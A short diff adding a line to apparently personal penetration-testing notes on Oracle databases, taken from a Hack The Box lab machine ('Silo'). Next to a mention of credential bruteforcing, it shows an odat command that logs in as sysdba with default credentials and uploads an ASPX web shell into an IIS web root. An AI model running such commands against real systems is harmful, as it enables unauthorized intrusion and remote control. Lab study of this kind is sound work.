@@ -36,3 +36,7 @@ Credentials bruteforce
 
 auxiliary/admin/oracle/oracle_login
 
+Upload shell in oracle:
+
+odat dbmsxslprocessor --sysdba -s 10.10.10.82 -U scott -P tiger -d XE --putFile "C:\\inetpub\\wwwroot\\" "shell1.aspx" "/home/deepak/HTB/Boxes/Silo/shell1.aspx"
+*****************************************************************************************************************************
